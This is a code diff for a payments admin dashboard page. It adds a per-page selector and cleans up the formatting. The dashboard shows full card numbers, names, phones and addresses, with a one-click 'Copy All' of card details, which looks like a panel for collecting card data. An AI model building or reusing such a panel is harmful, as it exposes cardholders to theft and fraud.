@@ -8,7 +8,6 @@
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link href="https://fonts.googleapis.com/css2?family=Onest:wght@400;500;600;700&display=swap" rel="stylesheet">
   <style>
-  
     :root {
       --card-bg: #DEE9FD;
       --blue: #414AFF;
@@ -631,9 +630,11 @@
       background: rgba(65, 74, 255, 0.07);
       font-weight: 600;
     }
+
     tbody tr.unread td {
       position: relative;
     }
+
     tbody tr.unread td:first-child::before {
       content: '';
       display: inline-block;
@@ -657,7 +658,11 @@
       transition: background 0.15s;
       opacity: 0.7;
     }
-    .btn-delete:hover { background: #fee2e2; opacity: 1; }
+
+    .btn-delete:hover {
+      background: #fee2e2;
+      opacity: 1;
+    }
 
     /* ── Confirm popup overlay ── */
     .confirm-overlay {
@@ -670,39 +675,110 @@
       align-items: center;
       justify-content: center;
     }
-    .confirm-overlay.open { display: flex; }
+
+    .confirm-overlay.open {
+      display: flex;
+    }
+
     .confirm-box {
       background: var(--card-bg);
       border-radius: 16px;
       padding: 28px 28px 22px;
       max-width: 360px;
       width: 90%;
-      box-shadow: 0 20px 60px rgba(65,74,255,0.18);
-      border: 1px solid rgba(255,255,255,0.6);
+      box-shadow: 0 20px 60px rgba(65, 74, 255, 0.18);
+      border: 1px solid rgba(255, 255, 255, 0.6);
       text-align: center;
       animation: slideUp .2s ease;
     }
-    .confirm-icon { font-size: 2rem; margin-bottom: 12px; }
-    .confirm-title { font-size: 1rem; font-weight: 700; color: var(--text); margin-bottom: 8px; }
-    .confirm-msg { font-size: 0.82rem; color: var(--muted); margin-bottom: 22px; line-height: 1.5; }
-    .confirm-btns { display: flex; gap: 10px; justify-content: center; }
+
+    .confirm-icon {
+      font-size: 2rem;
+      margin-bottom: 12px;
+    }
+
+    .confirm-title {
+      font-size: 1rem;
+      font-weight: 700;
+      color: var(--text);
+      margin-bottom: 8px;
+    }
+
+    .confirm-msg {
+      font-size: 0.82rem;
+      color: var(--muted);
+      margin-bottom: 22px;
+      line-height: 1.5;
+    }
+
+    .confirm-btns {
+      display: flex;
+      gap: 10px;
+      justify-content: center;
+    }
+
     .confirm-yes {
-      background: #dc2626; color: #fff; border: none;
-      padding: 10px 24px; border-radius: 8px;
-      font-size: 0.88rem; font-weight: 700;
+      background: #dc2626;
+      color: #fff;
+      border: none;
+      padding: 10px 24px;
+      border-radius: 8px;
+      font-size: 0.88rem;
+      font-weight: 700;
       font-family: 'Onest', sans-serif;
-      cursor: pointer; transition: background 0.2s;
+      cursor: pointer;
+      transition: background 0.2s;
     }
-    .confirm-yes:hover { background: #b91c1c; }
+
+    .confirm-yes:hover {
+      background: #b91c1c;
+    }
+
     .confirm-no {
-      background: var(--input-bg); color: var(--text);
+      background: var(--input-bg);
+      color: var(--text);
       border: 1px solid var(--border);
-      padding: 10px 24px; border-radius: 8px;
-      font-size: 0.88rem; font-weight: 600;
+      padding: 10px 24px;
+      border-radius: 8px;
+      font-size: 0.88rem;
+      font-weight: 600;
       font-family: 'Onest', sans-serif;
-      cursor: pointer; transition: all 0.2s;
+      cursor: pointer;
+      transition: all 0.2s;
     }
-    .confirm-no:hover { border-color: var(--blue); color: var(--blue); }
+
+    .confirm-no:hover {
+      border-color: var(--blue);
+      color: var(--blue);
+    }
+
+    .per-page-select {
+      background: var(--input-bg);
+      border: 1px solid var(--border);
+      border-radius: 8px;
+      color: var(--label);
+      padding: 9px 14px;
+      font-size: 0.82rem;
+      font-family: 'Onest', sans-serif;
+      font-weight: 600;
+      cursor: pointer;
+      transition: all 0.2s;
+      outline: none;
+      appearance: none;
+      -webkit-appearance: none;
+
+      /* same arrow style */
+      background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='10' height='6'%3E%3Cpath d='M0 0l5 6 5-6z' fill='%23414AFF'/%3E%3C/svg%3E");
+      background-repeat: no-repeat;
+      background-position: right 10px center;
+      padding-right: 28px;
+    }
+
+    .per-page-select:hover {
+      border-color: var(--blue);
+      color: var(--blue);
+      background: rgba(65, 74, 255, 0.07);
+    }
 
     /* ── Mobile */
     @media (max-width: 600px) {
@@ -800,29 +876,39 @@
             <button class="btn-refresh" onclick="refreshData()" id="refreshBtn">
               <span class="refresh-ico">↻</span> Refresh
             </button>
+            <div>
+              <select id="perPageSelect" class="per-page-select" onchange="onPerPageChange()">
+                <option value="20">20 Records</option>
+                <option value="40">40 Records</option>
+                <option value="60">60 Records</option>
+                <option value="80">80 Records</option>
+                <option value="100">100 Records</option>
+              </select>
+            </div>
           </div>
+
         </div>
 
         <div class="table-scroll">
           <table>
             <thead>
               <tr>
-                  
+
                 <th>#</th>
-              <th>Date</th>
+                <th>Date</th>
                 <th>Transaction ID</th>
                 <th>Name</th>
                 <th>Email</th>
                 <th>Card</th>
                 <th>Amount</th>
                 <th>Country</th>
-                
+
                 <th>Status</th>
                 <th>Delete</th>
             </thead>
             <tbody id="tableBody">
               <tr>
-                <td colspan="9" class="table-loading">
+                <td colspan="10" class="table-loading">
                   <div class="spinner"></div>Loading…
                 </td>
               </tr>
@@ -854,7 +940,8 @@
     <div class="confirm-box">
       <div class="confirm-icon">🗑️</div>
       <div class="confirm-title">Delete Record?</div>
-      <div class="confirm-msg">This action will permanently remove this record. This cannot be undone. Do you want to proceed?</div>
+      <div class="confirm-msg">This action will permanently remove this record. This cannot be undone. Do you want to
+        proceed?</div>
       <div class="confirm-btns">
         <button class="confirm-no" onclick="closeConfirm()">No, Cancel</button>
         <button class="confirm-yes" id="confirmYesBtn">Yes, Delete</button>
@@ -868,6 +955,7 @@
     let currentPage = 1;
     let searchQuery = '';
     let searchTimer;
+    let perPage = 20;
 
     async function doLogin() {
       const u = document.getElementById('loginUser').value.trim();
@@ -918,7 +1006,7 @@
       const tbody = document.getElementById('tableBody');
       tbody.innerHTML = '<tr><td colspan="10" class="table-loading"><div class="spinner"></div>Loading…</td></tr>';
       try {
-        const params = new URLSearchParams({ page, limit: 100, search: searchQuery });
+        const params = new URLSearchParams({ page, limit: perPage, search: searchQuery });
         const r = await fetch(`${API}/api/payments?${params}`, { headers: { Authorization: `Bearer ${token}` } });
         if (!r.ok) throw new Error();
         const { payments, total, pages } = await r.json();
@@ -936,7 +1024,7 @@
           const isUnread = !readIds.has(p._id);
           return `
         <tr onclick="openModal('${p._id}')" data-id="${p._id}" class="${isUnread ? 'unread' : ''}">
-          <td style="color:var(--muted);font-size:.8rem">${(page - 1) * 100 + i + 1}</td>
+          <td style="color:var(--muted);font-size:.8rem">${(page - 1) * perPage + i + 1}</td>
           <td style="color:var(--muted);font-size:.8rem">${date}<br><small>${time}</small></td>
           <td><span class="txn-id">${p.transaction_id?.substring(0, 8)}…</span></td>
           <td style="font-weight:600">${escHtml(p.name)}</td>
@@ -956,7 +1044,7 @@
         const pg = document.getElementById('pagination');
         const info = document.getElementById('pageInfo');
         const btns = document.getElementById('pageBtns');
-        info.textContent = `${(page - 1) * 100 + 1}–${Math.min(page * 100, total)} of ${total}`;
+        info.textContent = `${(page - 1) * perPage + 1}–${Math.min(page * perPage, total)} of ${total}`;
         btns.innerHTML = '';
         const makeBtn = (label, p2, disabled, active) => {
           const b = document.createElement('button');
@@ -970,6 +1058,7 @@
         makeBtn('→', page + 1, page >= pages, false);
         pg.style.display = 'flex';
       } catch { doLogout(); }
+      // console.log("Per Page:", perPage);
     }
 
     function onSearch(val) {
@@ -984,22 +1073,22 @@
       setTimeout(() => btn.classList.remove('spin'), 800);
     }
 
-   async function openModal(id) {
-  const overlay = document.getElementById('modalOverlay');
-  const body = document.getElementById('modalBody');
-  body.innerHTML = '<div style="text-align:center;padding:32px"><div class="spinner"></div></div>';
-  overlay.classList.add('open');
+    async function openModal(id) {
+      const overlay = document.getElementById('modalOverlay');
+      const body = document.getElementById('modalBody');
+      body.innerHTML = '<div style="text-align:center;padding:32px"><div class="spinner"></div></div>';
+      overlay.classList.add('open');
 
-  // Mark as read — remove unread highlight
-  markRead(id);
-  const row = document.querySelector(`tr[data-id="${id}"]`);
-  if (row) row.classList.remove('unread');
-  try {
-    const r = await fetch(`${API}/api/payments/${id}`, { headers: { Authorization: `Bearer ${token}` } });
-    const p = await r.json();
-    const date = new Date(p.created_at).toLocaleString();
+      // Mark as read — remove unread highlight
+      markRead(id);
+      const row = document.querySelector(`tr[data-id="${id}"]`);
+      if (row) row.classList.remove('unread');
+      try {
+        const r = await fetch(`${API}/api/payments/${id}`, { headers: { Authorization: `Bearer ${token}` } });
+        const p = await r.json();
+        const date = new Date(p.created_at).toLocaleString();
 
-    const allDetails = `Transaction ID: ${p.transaction_id}
+        const allDetails = `Transaction ID: ${p.transaction_id}
 Name on Card: ${p.name}
 Amount: $${parseFloat(p.amount || 0).toFixed(2)}
 Card Number: ${p.card}
@@ -1010,7 +1099,7 @@ Phone: ${p.phone}
 Address: ${p.address1}${p.address2 ? ' / ' + p.address2 : ''}, ${p.city}, ${p.state} ${p.postal}, ${p.country}
 Submitted At: ${date}`;
 
-    body.innerHTML = `
+        body.innerHTML = `
       <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:16px">
         <h3 style="margin:0;font-size:1rem;font-weight:600"></h3>
         <button id="copyAllBtn" onclick="copyAll(this, \`${allDetails.replace(/`/g, '\\`')}\`)"
@@ -1040,27 +1129,27 @@ Submitted At: ${date}`;
           <div class="val">${date}</div>
         </div>
       </div>`;
-  } catch {
-    body.innerHTML = '<div style="color:var(--red);text-align:center;padding:24px">Failed to load details.</div>';
-  }
-}
+      } catch {
+        body.innerHTML = '<div style="color:var(--red);text-align:center;padding:24px">Failed to load details.</div>';
+      }
+    }
 
-function closeModal() { document.getElementById('modalOverlay').classList.remove('open'); }
+    function closeModal() { document.getElementById('modalOverlay').classList.remove('open'); }
 
-function copyAll(btn, text) {
-  navigator.clipboard.writeText(text).then(() => {
-    btn.innerHTML = `<svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg> Copied!`;
-    btn.style.background = '#dcfce7';
-    btn.style.color = '#16a34a';
-    btn.style.borderColor = '#bbf7d0';
-    setTimeout(() => {
-      btn.innerHTML = `<svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copy All`;
-      btn.style.background = '#f1f5f9';
-      btn.style.color = '#475569';
-      btn.style.borderColor = '#e2e8f0';
-    }, 2000);
-  });
-}
+    function copyAll(btn, text) {
+      navigator.clipboard.writeText(text).then(() => {
+        btn.innerHTML = `<svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg> Copied!`;
+        btn.style.background = '#dcfce7';
+        btn.style.color = '#16a34a';
+        btn.style.borderColor = '#bbf7d0';
+        setTimeout(() => {
+          btn.innerHTML = `<svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copy All`;
+          btn.style.background = '#f1f5f9';
+          btn.style.color = '#475569';
+          btn.style.borderColor = '#e2e8f0';
+        }, 2000);
+      });
+    }
 
     // ── Delete functions ─────────────────────────────────────────────────────
     let pendingDeleteId = null;
@@ -1104,6 +1193,10 @@ function copyAll(btn, text) {
 
     if (token) { showDashboard(); }
     else { document.getElementById('loginScreen').style.display = 'flex'; }
+    function onPerPageChange() {
+      perPage = parseInt(document.getElementById('perPageSelect').value);
+      loadPayments(1);
+    }
   </script>
 </body>
 
